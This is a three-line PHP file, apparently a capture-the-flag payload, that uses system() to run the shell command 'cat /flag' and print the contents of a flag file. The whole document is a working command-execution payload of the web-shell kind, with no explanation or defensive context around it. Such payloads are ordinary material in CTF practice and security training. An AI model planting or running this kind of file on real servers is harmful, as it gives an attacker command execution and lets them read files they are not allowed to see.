<?php
system('cat /flag');
?>